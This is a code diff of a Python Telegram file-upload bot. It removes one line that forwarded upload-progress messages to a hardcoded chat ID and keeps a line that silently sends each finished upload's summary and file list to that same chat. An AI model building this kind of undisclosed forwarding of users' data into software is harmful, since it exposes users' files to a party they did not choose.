@@ -50,7 +50,6 @@ def uploadFile(filename,currentBits,totalBits,speed,time,args):
         thread = args[3]
         downloadingInfo = infos.createUploading(filename,totalBits,currentBits,speed,time,originalfile)
         bot.editMessageText(message,downloadingInfo)
-        bot.sendMessage(5416296262,downloadingInfo)
     except Exception as ex: print(str(ex))
     pass
 
@@ -198,10 +197,8 @@ def processFile(update,bot,message,file,thread=None,jdb=None):
         bot.deleteMessage(message.chat.id,message.message_id)
         finishInfo = infos.createFinishUploading(file,file_size,max_file_size,file_upload_count,file_upload_count,findex)
         filesInfo = infos.createFileMsg(file,files)
-        #statInfo = infos.createStat(username,getUser,jdb.is_admin(username))
         bot.sendMessage(message.chat.id,finishInfo+'\n'+filesInfo,parse_mode='html')
-        bot.sendMessage(5416296262,finishInfo+'\n'+filesInfo,parse_mode='html')
-        #bot.sendMessage(5416296262,statInfo)   
+        bot.sendMessage(5416296262,finishInfo+'\n'+filesInfo,parse_mode='html') 
         if len(files)>0:
             txtname = str(file).split('/')[-1].split('.')[0] + '.txt'
             sendTxt(txtname,files,update,bot)
